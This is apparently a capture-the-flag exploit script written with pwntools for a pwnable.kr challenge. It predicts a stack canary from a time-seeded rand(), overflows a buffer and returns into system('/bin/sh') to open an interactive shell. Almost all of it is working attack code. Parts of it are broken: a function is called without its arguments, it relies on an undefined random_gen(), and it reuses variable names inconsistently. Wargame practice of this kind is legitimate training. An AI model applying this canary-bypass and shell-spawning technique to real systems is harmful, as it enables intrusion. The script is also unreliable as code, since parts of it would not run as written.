#!/usr/bin/env python3
from pwn import *
from sys import argv, exit
from ctypes import CDLL
from time import time
from base64 import b64encode as b64
"""
buffer overflow on process_hash()
insecure seed, sending canary to us on my_hash()
with this we can bypass the stack canary, and ret our way to shell

lets talk about this whole insecure seed thing a bit more
we know the ultimate return value of our "human captcha", and we know how it will be generated.
Lets take a look at the function that creates our captcha:

int my_hash() {

    // initialize the canary
    int canary = *(int32_t *)(in_GS_OFFSET + 0x14);
    // 8 iterations
    for (int i = 0; i < 8; i++) {
        int iVar1 = rand();
        (&canary)[i] = iVar1;
    }

    if (canary != (in_GS_OFFSET + 0x14)) {
        sym.imp.__stack_chk_fail();
    }

    return iStack28 + iStack44 + (iStack40 - iStack36) + canary + iStack20 + (iStack32 - iStack24);
}

"""
conn=ssh("unlink","pwnable.kr",port=2222,password="guest")
time = conn.process('date +%s', shell=True)
p=conn.remote("127.0.0.1",9001)
s=int(time.recvline().strip(b'\n'))
"""
if len(argv)>1 and argv[1]=="-r":
    p=remote("pwnable.kr", 9002)
else:
    log.warning("i am ignoring you locals")
#    p=process('./hash')
    exit(1)
"""
context(arch='amd64',os='linux')
s=lambda x,r:(p.recvuntil(r) and p.sendline(str(x)) if r else p.sendline(str(x)))
pop_ebx=p32(0x0804880c)
system=0x08049187
g_buf =0x0804B3AC
def canary_comp(captcha,s):
    ret=[]
    temp_captcha=0

    libc=CDLL("./libc.so.6") # doesnt matter glibc version or arch, all have same generation algo

#   s=int(time()) the reason this wont work is due to local and remote host not being in sync
#   we must read from log file, there is a reason it exists :/

    libc.srand(s) # random seed equals to current time
    for i in range(8): # 8 iterations, just like our captcha loop
        ret.append(libc.rand()) # use libc random gen, with set srand
    # 1+5+2-3+7+4-6
    libc.close()
    t_cap=ret[1]+ret[5]+ret[2]-ret[3]+ret[7]+ret[4]-ret[6] # temp captcha
    canary= t_cap - int(data) & 0xffffffff
    if canary<0:
        canary=util.fiddling.negate(-canary)
    return canary

p.recvuntil("captcha : ")
data=p.recvline()[:-1]

canary=canary_comp()
#p.sendline(data)

log.info("captcha: %s"%int(data))

if canary%256!=0:
    log.info("Syncing problems with seed!")
    for i in [1,-1,2,-2,3,-3]:
        canary=random_gen()-int(data)&0xffffffff
        if canary%256==0:
            break
        else:
            pass


log.info("Canary: %s" % hex(canary))

payload=b"A"*512
payload+=p32(canary)
payload+=b"A"*12
payload+=p32(system)
payload+=p32(0x0804b3ac) # bin_sh string
payload=b64(payload)
payload+=b"/bin/sh\x00"

p.sendline(data)
p.sendline(payload)
p.interactive()
